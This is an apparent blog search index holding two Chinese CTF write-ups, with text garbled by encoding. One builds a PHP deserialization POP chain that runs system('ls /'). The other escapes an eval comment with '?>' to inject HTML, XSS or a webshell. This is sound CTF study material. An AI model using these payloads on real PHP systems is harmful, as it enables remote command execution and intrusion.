<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>DASCTF X GFCTF 2022åæœˆæŒ‘æˆ˜èµ›</title>
    <url>//post/2022DASCTF%20X%20GFCTF%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-wp/</url>
    <content><![CDATA[<p><code>æœ‰æ°´å¹³çš„</code></p>
<span id="more"></span>

<h1 id="DASCTF-X-GFCTF-2022åæœˆæŒ‘æˆ˜èµ›"><a href="#DASCTF-X-GFCTF-2022åæœˆæŒ‘æˆ˜èµ›" class="headerlink" title="DASCTF X GFCTF 2022åæœˆæŒ‘æˆ˜èµ›"></a>DASCTF X GFCTF 2022åæœˆæŒ‘æˆ˜èµ›</h1><h2 id="1-EasyPOP"><a href="#1-EasyPOP" class="headerlink" title="1.EasyPOP"></a>1.EasyPOP</h2><p>ä¸€é“æ„é€ <code>pop</code>é“¾çš„é¢˜ï¼Œæ‹¿æ¥ç»ƒä¹ ä¸€ä¸‹åˆ†æèƒ½åŠ›</p>
<p>åšååºåˆ—æ„é€ <code>pop</code>é“¾æœ€é‡è¦è¿˜æ˜¯è¦ä¼šè”æƒ³ï¼Œä»è€Œè§¦å‘æ–¹æ³•</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fine</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$cmd</span>, <span class="variable">$content</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="variable">$cmd</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content = <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;cmd, <span class="variable">$this</span>-&gt;content);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Go listen to Jay Chou&#x27;s secret-code! Really nice&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ctf</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$time</span> = <span class="string">&quot;Two and a half years&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$ctf</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ctf = <span class="variable">$ctf</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;ctf-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line"> <span class="comment">//showç±»æœ‰this-&gt;ctf-&gt;show() è”æƒ³ä¸€ä¸‹__callå‡½æ•°ï¼Œæˆ–è€…çœ‹çœ‹å…¶ä»–ç±»æœ‰showå‡½æ•°æ²¡ï¼Œåœ¨secret_codeç±»ä¸­å‘ç°æœ‰showå‡½æ•°ï¼Œè€Œå…¶å‡½æ•°å†…è¯­å¥ä¼šè§¦å‘__geté­”æœ¯ï¼Œè€Œ__geté­”æœ¯ä¼šè§¦å‘fineç±»çš„__invokeé­”æœ¯ï¼Œå…¶ä¸­çš„call_user_funcå°±æ˜¯å®ç°ååºåˆ—åŒ–å‘½ä»¤æ‰§è¡Œçš„å…³é”®ï¼Œæ‰€ä»¥è¿™é‡Œå¹¶ä¸è§¦å‘__callé­”æœ¯</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>): <span class="title">string</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;ctf . <span class="string">&quot;: Duration of practice: &quot;</span> . <span class="variable language_">$this</span>-&gt;time;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sorry</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hint</span> = <span class="string">&quot;hint is depend on you&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hint = <span class="keyword">new</span> <span class="title function_ invoke__">secret_code</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;key;</span><br><span class="line">        <span class="variable">$name</span>();</span><br><span class="line"><span class="comment">//sorryç±»çš„__getå‡½æ•°æœ‰$name()ï¼Œè”æƒ³åˆ°__invokeï¼Œfineç±»çš„__invoke å‡½æ•°æœ‰call_user_funcå‡½æ•°ï¼Œä¹Ÿå°±æ˜¯çªç ´å£</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;password == <span class="variable language_">$this</span>-&gt;name) &#123;</span><br><span class="line">    <span class="comment">//è¿™é‡Œçš„passwordå’Œnameå°±éœ€è¦å¤–éƒ¨å®ä¾‹åŒ–åèµ‹å€¼ä¸ºç›¸åŒçš„ï¼Œå› ä¸ºè¿™æ ·æ‰èƒ½é€šè¿‡ä¸‹é¢è¯­å¥è°ƒç”¨é­”æœ¯æ–¹æ³•ï¼Œè€Œä¸æ‰§è¡Œelseè¯­å¥</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;hint;</span><br><span class="line">        <span class="comment">//sorryçš„ææ„å‡½æ•°æœ‰echo $this-&gt;hint è”æƒ³ä¸€ä¸‹__toStringå‡½æ•°ï¼Œåœ¨Showç±»ä¸­</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;name = <span class="string">&quot;jay&quot;</span>) &#123;</span><br><span class="line">            secret_code::<span class="title function_ invoke__">secret</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;This is our code&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getPassword</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setPassword</span>(<span class="params"><span class="variable">$password</span></span>): <span class="title">void</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">secret_code</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$code</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">secret</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">include_once</span> <span class="string">&quot;hint.php&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">hint</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$num</span> = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$num</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;code-&gt;secret;  </span><br><span class="line"><span class="comment">//secret_codeç±»çš„showå‡½æ•°æœ‰this-&gt;code-&gt;secretï¼Œsecretå±æ€§æ˜¯æ‰€æœ‰ç±»éƒ½æ²¡æœ‰çš„ï¼Œè‡ªç„¶è”æƒ³åˆ°__getï¼Œåœ¨Sorryç±»é‡Œ</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">    <span class="variable">$a</span>-&gt;<span class="title function_ invoke__">setPassword</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>()));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">show</span>(<span class="string">&quot;Ctfer&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span>-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>popé“¾çš„æ„é€ </p>
<p>åˆ‡å…¥å£ sorryç±»çš„ææ„å‡½æ•°ï¼Œ<strong>çªç ´å£fineç±»çš„__invokeå‡½æ•°ä¸­çš„call_user_funcå‡½æ•°</strong></p>
<p><code>sorry.__destruct -&gt; show.__toString</code><br><code>-&gt;</code><br><code>secret.show()</code><br><code>-&gt;</code><br><code>sorry.__get() -&gt; fine.__invoke()</code><br><code>-&gt;</code><br><code>call_user_funcå‡½æ•°</code></p>
<p>#call_user_func(a,b) â€” æŠŠç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°è°ƒç”¨, å…¶ä½™å‚æ•°æ˜¯å›è°ƒå‡½æ•°çš„å‚æ•°<br>#ä¹Ÿå°±æ˜¯æŠŠaå½“ä½œå‡½æ•°ï¼ŒæŠŠbå½“ä½œä¼ å…¥aå‡½æ•°çš„å‚æ•°ã€å¦‚call_user_func(assert,phpinfo()),å°±ä¼šæ‰§è¡Œä»£ç phpinfo()ã€‘</p>
</blockquote>
<p>æ‰€ä»¥<code>payload</code>ä¸º</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fine</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ctf</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$time</span> = <span class="string">&quot;Two and a half years&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sorry</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hint</span> = <span class="string">&quot;hint is depend on you&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">secret_code</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$Fine</span> = <span class="keyword">new</span> <span class="title function_ invoke__">fine</span>();</span><br><span class="line"><span class="variable">$Show</span> = <span class="keyword">new</span> <span class="title function_ invoke__">show</span>();</span><br><span class="line"><span class="variable">$Sorry</span> = <span class="keyword">new</span> <span class="title function_ invoke__">sorry</span>();</span><br><span class="line"><span class="variable">$Sorry2</span> = <span class="keyword">new</span> <span class="title function_ invoke__">sorry</span>();</span><br><span class="line"><span class="comment">//è¿™é‡Œå®ä¾‹åŒ–ä¸¤æ¬¡sorryæ˜¯å› ä¸ºå½“ï¼Œè„šæœ¬è¿è¡Œå®Œæ¯•åï¼Œä¼šæ‰§è¡Œ__destruct()é­”æœ¯æ–¹æ³•ï¼Œä»è€Œæ¸…ç©ºäº†å˜é‡å¼•ç”¨ï¼Œä¹Ÿå°±ç›¸å½“äºå…³é—­äº†è¿™ä¸ªç±»ï¼Œ</span></span><br><span class="line"><span class="comment">//ä½†æ˜¯åç»­è¿˜éœ€è¦è°ƒç”¨å…¶ä¸­çš„é­”æœ¯æ–¹æ³•ï¼Œæ‰€ä»¥éœ€è¦å†æ¬¡å®ä¾‹åŒ–ï¼Œå¹¶é‡æ–°ä¸ºpasswordå’Œnameç›¸åŒèµ‹å€¼</span></span><br><span class="line"><span class="variable">$Secret</span> = <span class="keyword">new</span> <span class="title function_ invoke__">secret_code</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$Sorry</span>-&gt;name = <span class="string">&#x27;cc&#x27;</span>;</span><br><span class="line"><span class="variable">$Sorry</span>-&gt;password = <span class="string">&#x27;cc&#x27;</span>;</span><br><span class="line"><span class="variable">$Sorry</span>-&gt;hint = <span class="variable">$Show</span>;</span><br><span class="line"><span class="variable">$Show</span>-&gt;ctf = <span class="variable">$Secret</span>;</span><br><span class="line"><span class="variable">$Secret</span>-&gt;code = <span class="variable">$Sorry2</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$Sorry2</span>-&gt;name = <span class="string">&#x27;cc&#x27;</span>;</span><br><span class="line"><span class="variable">$Sorry2</span>-&gt;password = <span class="string">&#x27;cc&#x27;</span>;</span><br><span class="line"><span class="variable">$Sorry2</span>-&gt;key = <span class="variable">$Fine</span>;</span><br><span class="line"><span class="variable">$Fine</span>-&gt;cmd = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"><span class="variable">$Fine</span>-&gt;content = <span class="string">&#x27;ls /&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$Sorry</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p><strong>è¡¥å……</strong>ï¼šå¦ä¸€ç§å†™æ³•ï¼Œä¸€å®šè¦<code>url</code>ç¼–ç ï¼Œå› ä¸ºé‡Œè¾¹æœ‰ä¸å¯è§å­—ç¬¦ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fine</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$content</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$cmd</span>, <span class="variable">$content</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="variable">$cmd</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content = <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ctf</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$time</span> = <span class="string">&quot;Two and a half years&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$ctf</span>, <span class="variable">$time</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ctf = <span class="variable">$ctf</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;time = <span class="variable">$time</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sorry</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hint</span> = <span class="string">&quot;hint is depend on you&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$password</span>,<span class="variable">$hint</span>,<span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hint  = <span class="variable">$hint</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = <span class="variable">$key</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">secret_code</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$code</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;code = <span class="variable">$code</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$Sorry</span>= <span class="keyword">new</span> <span class="title function_ invoke__">sorry</span>(<span class="string">&#x27;cc&#x27;</span>,<span class="string">&#x27;cc&#x27;</span>,<span class="keyword">new</span> <span class="title function_ invoke__">show</span>(<span class="keyword">new</span> <span class="title function_ invoke__">secret_code</span>(<span class="keyword">new</span> <span class="title function_ invoke__">sorry</span>(<span class="string">&#x27;cc&#x27;</span>,<span class="string">&#x27;cc&#x27;</span>,<span class="string">&#x27;cc&#x27;</span>,<span class="keyword">new</span> <span class="title function_ invoke__">fine</span>(<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;ls&#x27;</span>))),<span class="string">&#x27;cc&#x27;</span>),<span class="string">&#x27;cc&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//å› ä¸ºè¿™é‡Œæ²¡æœ‰ä¿®æ”¹å˜é‡ä¿®é¥°ï¼Œ</span></span><br><span class="line"><span class="comment">//å¯¹äºprivateä¿®é¥°å˜é‡æ— æ³•ç›´æ¥ä¼ å‚ï¼Œéœ€è¦å®ä¾‹åŒ–ç±»xx(a,b)ï¼Œç„¶åæ‰èƒ½æˆåŠŸä¼ å‚ï¼Œå½“ç„¶publicç±»ä¹Ÿå¯ä»¥ç”¨è¿™ç§æ–¹æ³•ä¼ å‚ï¼Œåªæ˜¯æ²¡å¿…è¦ï¼Œä½†è¿™é‡Œæ˜¯ç”¨äº†çš„</span></span><br><span class="line"><span class="comment">//æ¯”å¦‚sorryç±»ä¸­nameå’Œpasswordå˜é‡èµ‹å€¼ä¸ºccåï¼Œåé¢å®ä¾‹åŒ–çš„showç±»å°±æ˜¯èµ‹å€¼ç»™public hintå˜é‡ï¼Œæ˜¯æŒ‰å˜é‡å£°æ˜é¡ºåºæ¥è¿›è¡Œèµ‹å€¼çš„</span></span><br><span class="line"><span class="comment">//è¿™é‡Œçš„åµŒå¥—å°±æ˜¯åŒä¸Šé¢çš„payloadä¸€æ ·ï¼Œåªæ˜¯æŠŠå˜é‡èµ‹å€¼ä¸ºå®ä¾‹åŒ–çš„ç±»ï¼Œå®ä¾‹åŒ–ç±»çš„é‡Œé¢å†åµŒå…¥å˜é‡å€¼å’Œå…¶ä»–å®ä¾‹åŒ–çš„ç±»</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$Sorry</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>ç½‘ç»œå®‰å…¨å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>Game</tag>
      </tags>
  </entry>
  <entry>
    <title>NewStarCTF2022å…¬å¼€èµ›-wp</title>
    <url>//post/2022NewStarCTF/</url>
    <content><![CDATA[<p><code>æ²¡å•¥ç®€ä»‹</code></p>
<span id="more"></span>

<h1 id="NewStarCTF2022å…¬å¼€èµ›"><a href="#NewStarCTF2022å…¬å¼€èµ›" class="headerlink" title="NewStarCTF2022å…¬å¼€èµ›"></a>NewStarCTF2022å…¬å¼€èµ›</h1><p><code>è™½ç„¶æ˜¯åˆ«äººå­¦æ ¡çš„æ–°ç”Ÿèµ›ï¼Œéš¾åº¦ä¸æ˜¯å¾ˆé«˜ï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰è®¸å¤šå€¼å¾—å­¦ä¹ çš„çŸ¥è¯†ç‚¹</code></p>
<h2 id="1-NotPHP"><a href="#1-NotPHP" class="headerlink" title="1.NotPHP"></a>1.NotPHP</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]) == <span class="string">&quot;Welcome to CTF&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>] !== <span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>])&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]) == <span class="number">2077</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Hack Me&quot;</span>;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;#&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Number error!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Wrong Key!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Pass it!&quot;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œç»•è¿‡ä¸ç»†è®²ï¼Œéƒ½æ˜¯å¸¸è§çš„</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;#&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>ç»†è®²è¿™ä¸ª</p>
<p>è¿™ä¸ªæ˜¯ä¸€ä¸ª<code>eval</code>å‡½æ•°ï¼Œä½†æ˜¯é‡Œé¢å…¶å®å·²ç»è¢«<code>#</code>ç»™æ³¨é‡Šæ‰äº†ï¼Œ</p>
<p>æ‰€ä»¥æ— è®ºè¾“å…¥ä»€ä¹ˆéƒ½æ²¡ç»“æœ</p>
<hr>
<p>å› æ­¤éœ€è¦é—­åˆæˆ–è€…ç»•è¿‡<code>#</code></p>
<p>ä½†æ˜¯æˆ‘è¯•äº†å¾ˆå¤šé—­åˆæ–¹å¼ï¼Œç»“æœéƒ½æ²¡ååº”</p>
<p>æœ€åå‘ç°</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å®ç°äº†è¯­å¥é—­åˆï¼Œ</p>
<p>ä½†æ˜¯ï¼Œå½“æŠŠè¿™ä¸ªphpç»“å°¾ç¬¦åŠ åˆ°åé¢æ—¶å€™ï¼Œè¿™ä¸ªphpå°±å°±ç»“æŸäº†</p>
<p>ä»¥</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;#&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>ä¸ºä¾‹å­</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">url/xxx&amp;cmd=?&gt;haha</span><br></pre></td></tr></table></figure>

<p>å½“æˆ‘ä»¬é—­åˆäº†phpä»£ç åï¼Œé‚£åé¢çš„<code>haha</code>çš„ä½ç½®åœ¨å“ªé‡Œå‘¢</p>
<p><img src="/post/2022NewStarCTF/image-20220921083750913.png" alt="image-20220921083750913"></p>
<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œ<code>haha</code>å˜æˆäº†<code>html</code>ä»£ç </p>
<p>é‚£ä¹ˆå°±å¯ä»¥æ“ä½œäº†ï¼Œ</p>
<p>æ¯”å¦‚xssï¼Œä¸€å¥è¯ğŸçš„æ’å…¥ç­‰</p>
